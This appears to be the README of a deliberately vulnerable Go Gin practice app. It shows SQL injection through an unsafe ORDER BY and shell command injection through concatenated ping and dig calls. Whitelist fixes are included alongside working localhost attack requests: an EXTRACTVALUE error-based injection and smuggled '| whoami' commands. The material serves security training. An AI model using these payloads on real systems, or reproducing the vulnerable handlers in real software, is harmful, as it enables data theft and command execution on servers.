# Go Gin vulnerability Example 

An example of gin contains many useful vul

一个go写的WEB漏洞靶场，实际自己写一下，加固一下知识

GIN框架 整个web框架是go-gin-Example 上面改的，没有前端框架，只有一个swagger，直接发包吧






## 0x01 sqli

实际中最常见的一种编码问题 Order by 之后存在列和表的的时候，一般采用拼接的情况出现sql注入

由于表/列名无法使用参数化查询，所以推荐使用白名单或转义操作

routers/api/unAuth/sql.go
````
db.Order(xxxx).First(&user)
````
对于列名的修复，稳妥的是白名单
````
validCols := map[string]bool{"col1": true, "col2":true}

if _, ok := validCols[xxxx]; !ok {
fmt.Println("illegal column")
return
}
db.Order(xxxx)
````


````
POST /sql/login HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 106

user=user&password=123456 AND EXTRACTVALUE(9509,CONCAT(0x5c,(SELECT user from blog.blog_login LIMIT 0,1)))
````

白名单修复后
````
POST /sql/loginSafe HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 106

user=user&password=123456 AND EXTRACTVALUE(9509,CONCAT(0x5c,(SELECT user from blog.blog_login LIMIT 0,1)))
````



# Command execution

当使用exec等功能系统调用
应该使用白名单来限制的范围可执行命令。
不使用bash, sh


直接拼接

routers/api/unAuth/cmd.go
````
    ipaddr := c.PostForm("ip")
    Command := fmt.Sprintf("ping -c 4 %s", ipaddr)
    output, err := exec.Command("/bin/sh", "-c", Command).Output()
	if err != nil {
		fmt.Println(err)
		return
	}
	c.JSON(200, gin.H{
		"success": output,
	})
````


````
POST /api/vul/cmd HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

ip=127.0.0.1 | echo zeo
````
 
// 参数绑定拼接
```go
type MyMsg struct {
Domain   string `json:"domain"`
Password string `json:"password"`
}


// ---> 声明结构体变量
var a MyMsg
// ---> 绑定数据
if err := c.ShouldBindJSON(&a); err != nil {
c.AbortWithStatusJSON(
http.StatusInternalServerError,
gin.H{"error": err.Error()})
return
}
output, _ := exec.Command("/bin/bash", "-c", "dig "+a.Domain).CombinedOutput() // python -c is also vulnerable
println(output)
c.JSON(200, gin.H{
"success": output,
})
```
```
POST /api/vul/cmd2 HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Content-Type: application/json
Content-Length: 64

{
    "domain":"baidu.com | whoami",
    "password":"pssss"
}
```
Good Practice

建议直接写死，白名单